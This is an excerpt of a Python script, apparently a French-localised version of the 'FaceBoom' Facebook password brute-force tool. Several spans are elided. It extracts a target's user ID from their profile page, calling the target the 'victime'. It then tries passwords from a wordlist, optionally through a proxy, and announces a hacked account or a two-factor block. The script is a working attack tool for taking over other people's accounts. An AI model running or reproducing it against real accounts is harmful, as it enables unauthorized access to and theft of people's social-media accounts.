...
try:import requests
    ...
    print("  [*] Pardon utilise: 'pip install requests' to install it :)")
    sys.exit(1)
try:import mechanize
except ImportError:
    errMsg("[ mechanize ] module is missing")
    print("  [*] Pardon utilise: 'pip install mechanize' to install it :)")
    sys.exit(1)
...
class FaceBoom(object):
    ...
    def get_profile_id(self, target_profile):
        try:
            print(gr+"\n["+wi+"*"+gr+"] Récupération de l'ID... svp patienter..."+wi)
            idre = re.compile('(?<="userID":").*?(?=")')
            con = requests.get(target_profile).text
            idis = idre.search(con).group()
            print(wi+"\n["+gr+"+"+wi+"]"+gr+" Le compte de la victime"+wi+" a pour ID: "+yl+idis+wi)
        except Exception:
            errMsg("Svp verifie le lien URL de profil de ta victime")
            sys.exit(1)
...
[>] ProxyStatus :> """+str(proxystatus)+wi)
        if not single_passwd:
            print(gr+"""\
=================================="""+wi+"""
[~] """+yl+"""Brute"""+rd+""" ForceATTACK: """+gr+"""Activé """+wi+"""[~]"""+gr+"""
==================================\n"""+wi)
        else:print("\n")
    ...
    def updateFaceBoom():
        if not os.path.isfile(versionPath):
             errMsg("Incapable de vérifier les mises à jour: Svp re-clonez le script pour resoudre ce problème")
             sys.exit(1)
        write("[~] Vérification svp veillez patienter...\n")
        ...
        if repoVersion == currentVersion:write("  [*] Le Script est à jour!\n")
        else:
                print("  [+] Une mise à niveau a été trouvé ::: En cours.... ")
...
def Main():
   ...
   if any(opt for opt in opts):
     if not faceboom.cnet():
       errMsg("Hmmmm, Vérifie ta connexion internet.")
       sys.exit(1)
   if update:
    ...
    sys.exit(1)
        ...
        if wordlist:
            if not os.path.isfile(wordlist):
                errMsg("Merde, vérifie le chemin de ton Wordlist mec.")
                sys.exit(1)
        if single_passwd:
            if len(single_passwd.strip()) < 6:
                errMsg("Mot de passe incorrect")
                print("[!] Le mot de passe doit avoir au moins '6' long caractère.")
                sys.exit(1)
        if proxy:
             if proxy.count(".") != 3:
        ...
        for passwd in passwords:
                ...
                if retCode:
                    sys.stdout.write(wi+" ==> Login:"+gr+" Compte piraté bro.\n")
                    print(wi+"========================="+"="*len(passwd)+"======")
                    print(wi+"["+gr+"+"+wi+"] Le mot de passe :[ "+gr+passwd+wi+" ]"+gr+" est correct :)")
                    print(wi+"========================="+"="*len(passwd)+"======")
                    if retCode == 2:print(wi+"["+yl+"!"+wi+"]"+yl+" Info: Bro,le compte utilise ("+rd+"la double Authentication"+yl+"):"+rd+" C'est bloqué maintenant"+yl+" !!!")
                    break
                else:
                    sys.stdout.write(yl+" ==> Login:"+rd+" Non non, c'est pas ça bro.\n")
                    loop = loop + 1 if not single_passwd else "~"
        else:
                if single_passwd:
                    print(yl+"\n["+rd+"!"+yl+"] Merde: "+wi+"Le mot de passe[ "+yl+passwd+wi+" ] n'est pas correct"+rd+":("+yl+"!"+wi)
                    print(gr+"["+yl+"!"+gr+"]"+yl+" Svp,essayez un autre mot de passe ou Wordlist "+gr+":)"+wi)
                else:
                    print(yl+"\n["+rd+"!"+yl+"] Merde: "+wi+"Je ne peux pas trouver le mot de passe dans [ "+yl+wordlist+wi+" ] "+rd+":("+yl+"!"+wi)
                    print(gr+"["+yl+"!"+gr+"]"+yl+" Svp essayez un autre Wordlist. "+gr+":)"+wi)
        sys.exit(1)
   else:
       print(parse.usage)
       sys.exit(1)
